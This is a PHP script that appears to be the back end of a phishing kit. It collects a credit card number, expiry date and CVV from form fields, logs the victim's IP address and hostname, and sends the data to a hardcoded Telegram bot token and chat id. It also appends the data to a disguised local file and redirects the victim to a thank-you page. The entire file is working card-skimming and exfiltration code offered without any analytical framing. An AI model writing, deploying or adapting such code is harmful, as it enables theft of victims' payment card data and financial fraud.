<?php



$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$bilsmg .= "----------------------------------------------------------------------[$ip]------\n";
$bilsmg .= "CC:           : ".$_POST['uTc']."\n";
$bilsmg .= "dt:           : ".$_POST['uEy']."\n";
$bilsmg .= "cvv:           : ".$_POST['uEc']."\n";
$bilsmg .= "IP             : $ip | $hostname\n";


$token = "5341209074:AAEz8VrqTFdVbGdHFkTBOqNW7Ko_JGj3swo";
file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=1348600628&text=" . urlencode($bilsmg)."" );

$f = fopen("python/python.php", "a");
	fwrite($f, $bilsmg);
header("Location: thanks.html");
?>



